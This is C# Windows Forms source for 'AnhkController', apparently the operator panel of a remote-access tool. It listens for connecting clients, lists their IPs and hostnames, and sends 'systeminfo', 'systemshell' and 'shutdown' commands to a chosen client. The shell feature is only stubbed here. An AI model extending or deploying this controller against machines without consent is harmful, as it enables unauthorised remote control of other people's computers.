using System.Net;
using System.Net.Sockets;
using System.Text;

namespace AnhkController
{
    public partial class Form1 : Form
    {
        public Server _server;

        public bool serverOnline = false;


        public Form1()
        {
            InitializeComponent();
            listView1.Columns.Add("IP Address", 120);  // Add another column to ListView control in the Form class
            listView1.Columns.Add("Hostname", 120);   // Added Hostname column

            _server = new Server(this.ConsoleTextBox, this.ClientsLabel, listView1, IpAddressTextBox.Text, int.Parse(PortTextBox.Text));  // Pass a reference to TextBox and Label controls and ListView control in the constructor
        }

        public void EndScroll()
        {



            ConsoleTextBox.SelectionStart = ConsoleTextBox.Text.Length;
            ConsoleTextBox.ScrollToCaret();
        }

        private async void StartServerButton_Click(object sender, EventArgs e)
        {
            if (serverOnline == false)
            {
                _server = new Server(this.ConsoleTextBox, this.ClientsLabel, listView1, IpAddressTextBox.Text, int.Parse(PortTextBox.Text));
                serverOnline = true;
                StartServerButton.Text = "Stop Server";
                ServerStatusIndicatorLabal.ForeColor = Color.Green;
                ServerStatusIndicatorLabal.Text = "Online";
                ConsoleTextBox.Text += Environment.NewLine + "Listening for connections..." + Environment.NewLine; // Log message on the form\n
                EndScroll();
                await Task.Run(() => _server.StartServer());
            }
            else
            {
                serverOnline = false;
                StartServerButton.Text = "Start Server";
                ServerStatusIndicatorLabal.ForeColor = Color.Red;
                ServerStatusIndicatorLabal.Text = "Offline";
                ConsoleTextBox.Text += Environment.NewLine + "Server shutdown successfully..." + Environment.NewLine; // Log message on the form\n
                EndScroll();
            }
        }

        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var item = this.listView1.GetItemAt(e.X, e.Y); // Get the selected ListViewItem

                if (item != null)
                {
                    ContextMenuStrip.Show((Control)sender, new Point(e.X, e.Y));  // Show the context menu at the cursor's position
                }
            }
        }

        public async Task SendAsync(Socket clientSocket, byte[] buffer, SocketFlags socketflags)
        {
            await clientSocket.SendAsync(new ArraySegment<byte>(buffer), socketflags);
        }

        private async Task<int> ReceiveData(Socket handler, byte[] buffer)
        {
            return await handler.ReceiveAsync(buffer, SocketFlags.None);
        }

        private void SendDataToClient(Server.ClientListViewItem client, string message)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(message); // Convert your message into bytes array

            try
            {
                this.SendAsync(client.Socket, buffer, SocketFlags.None).Wait();  // Send data asynchronously to the client's socket

                ReceiveSystemInfoFromClient(client); // Call new method for receiving system info from client
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }

        public async Task ReceiveSystemInfoFromClient(Server.ClientListViewItem client)  // This new method will receive system info from a specific client and print it in the TextBox
        {
            byte[] buffer = new byte[1024];

            int receivedBytes = await this.ReceiveData(client.Socket, buffer);  // Receive data asynchronously from the client's socket

            string systemInfo = Encoding.UTF8.GetString(buffer, 0, receivedBytes); // Convert received bytes to a string

            ConsoleTextBox.Text += Environment.NewLine + $"{systemInfo}" + Environment.NewLine; // Log message on the form\n
            EndScroll();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            // If there's any selected text, just select it. Otherwise, select all
            if (ConsoleTextBox.SelectionLength == 0)
                ConsoleTextBox.SelectAll();

            // Scroll to the end of the TextBox
            ConsoleTextBox.ScrollToCaret();
        }
        // System Tab
        private void sysToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Get selected ListViewItem and cast it to Server.ClientListViewItem type
            var client = (Server.ClientListViewItem)listView1.SelectedItems[0];

            if (client != null)
            {
                ConsoleTextBox.Text += Environment.NewLine + "Sending System Information Request...";
                SendDataToClient(client, "systeminfo"); // Call your method for sending data to the client
            }
        }

        private void shellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Get selected ListViewItem and cast it to Server.ClientListViewItem type
            var client = (Server.ClientListViewItem)listView1.SelectedItems[0];

            if (client != null)
            {
                ConsoleTextBox.Text += Environment.NewLine + "Shell Active..." + Environment.NewLine;
                EndScroll();
                SendDataToClient(client, "systemshell"); // Call your method for sending data to the client
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Get selected ListViewItem and cast it to Server.ClientListViewItem type
            var client = (Server.ClientListViewItem)listView1.SelectedItems[0];

            if (client != null)
            {
                ConsoleTextBox.Text += Environment.NewLine + "Sending Shutdown Request..." + Environment.NewLine;
                EndScroll();
                SendDataToClient(client, "shutdown"); // Call your method for sending data to the client
            }
        }

        private void IpAddressTextBox_TextChanged(object sender, EventArgs e)
        {
            if (serverOnline)
            {
                // Stop current server
                serverOnline = false;
                StartServerButton.Text = "Start Server";
                ServerStatusIndicatorLabal.ForeColor = Color.Red;
                ServerStatusIndicatorLabal.Text = "Offline";

                // Update _server instance with new IP address and start server again
                _server = new Server(this.ConsoleTextBox, this.ClientsLabel, listView1, IpAddressTextBox.Text, int.Parse(PortTextBox.Text));
                serverOnline = true;
                StartServerButton_Click(null, null); // Start the server again
            }
        }

        private void PortTextBox_TextChanged(object sender, EventArgs e)
        {
            if (serverOnline)
            {
                // Stop current server
                serverOnline = false;
                StartServerButton.Text = "Start Server";
                ServerStatusIndicatorLabal.ForeColor = Color.Red;
                ServerStatusIndicatorLabal.Text = "Offline";

                // Update _server instance with new port and start server again
                _server = new Server(this.ConsoleTextBox, this.ClientsLabel, listView1, IpAddressTextBox.Text, int.Parse(PortTextBox.Text));
                serverOnline = true;
                StartServerButton_Click(null, null); // Start the server again
            }
        }

    }

    public class Server : Form
    {
        private readonly Socket _serverSocket;
        public delegate void UpdateTextCallback(string text);
        private readonly Control _textbox, _label; // Add a field for TextBox control in the Server class
        public int clients { get; set; } = 0;  // Added "public" here to allow access from Form1 class.
        private System.Windows.Forms.ListView listView;   // Added ListView control to store connected clients
        private System.Windows.Forms.TextBox ConsoleTextBox;
        private Label ClientsLabel;

        public Server(Control textbox, Control label, System.Windows.Forms.ListView lv, string ipAddress, int port)
     : base()  // Call the base constructor
        {
            IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Parse(ipAddress), port);
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _serverSocket.Bind(ipEndPoint);
            _serverSocket.Listen(500); // Set the backlog size to 500 connections
            listView = lv;
            _textbox = textbox;
            _label = label;
        }

        public async Task StartServer()
        {
            UpdateTextOnForm("Server started on " + _serverSocket.LocalEndPoint + Environment.NewLine); // Log message on the form with IP address and port number

            while (true)
            {
                Socket clientSocket = await AcceptClient();  // <-- This is now correct.

                string ip = ((IPEndPoint)clientSocket.RemoteEndPoint).Address.ToString();
                string hostname = Dns.GetHostEntry(ip).HostName;
                UpdateTextOnForm("Client connected: " + clientSocket.RemoteEndPoint + ", Hostname: " + hostname + Environment.NewLine);

                clients++;
                listView.Invoke((MethodInvoker)(() => listView.Items.Add(new ClientListViewItem(clientSocket.RemoteEndPoint.ToString(), clientSocket, hostname))));  // Add new ListView item with IP address and Socket
                UpdateLabel();

                _ = Task.Run(() => HandleClient(clientSocket));
            }
        }

        private void RemoveDisconnectedClientFromListView(string address)
        {
            listView.Invoke((MethodInvoker)(() =>
            {
                foreach (ListViewItem item in listView.Items)
                {
                    if ((item as ClientListViewItem)?.Socket?.RemoteEndPoint?.ToString() == address)   // Check the IP address of each connected client
                        listView.Items.Remove(item);
                }
            }));
        }

        private async Task<int> ReceiveData(Socket handler, byte[] buffer)
        {
            return await handler.ReceiveAsync(buffer, SocketFlags.None);
        }

        public async Task HandleClient(Socket clientSocket)
        {
            byte[] buffer = new byte[1024];

            while (true)
            {
                try
                {
                    int receivedBytes = await ReceiveData(clientSocket, buffer);

                    if (receivedBytes == 0) // Client has disconnected
                    {
                        UpdateTextOnForm("Client disconnected: " + clientSocket.RemoteEndPoint + Environment.NewLine);

                        clients--;
                        RemoveDisconnectedClientFromListView(clientSocket.RemoteEndPoint.ToString());
                        UpdateLabel();
                        return; // Exit this task when client disconnects
                    }

                    // Process received data...
                }
                catch (Exception ex)
                {
                    UpdateTextOnForm("Client disconnected: " + clientSocket.RemoteEndPoint + Environment.NewLine);
                    Console.WriteLine($"An error occurred: {ex}");
                    clients--;
                    RemoveDisconnectedClientFromListView(clientSocket.RemoteEndPoint.ToString());
                    UpdateLabel();
                    return; // Exit this task when an error occurs
                }
            }
        }

        public class ClientListViewItem : ListViewItem // Custom ListViewItem that includes a Socket field
        {
            public Socket Socket { get; set; }
            public string Hostname { get; set; }  // Added property for the client's hostname

            public ClientListViewItem(string text, Socket socket, string hostname) : base(text)
            {
                this.Socket = socket;
                this.Hostname = hostname;     // Set the hostname property to the provided value
            }
        }


        private void UpdateTextOnForm(string text)  // Method to update TextBox's content on UI thread
        {
            _textbox.Invoke((MethodInvoker)(() => _textbox.Text += $"{text}\n"));
        }

        private void UpdateLabel()  // method to update label with current number of clients
        {
            _label.Invoke((MethodInvoker)(() => _label.Text = $"Clients: {clients}"));
        }

        private async Task<Socket> AcceptClient()
        {
            return await _serverSocket.AcceptAsync();
        }
    }
}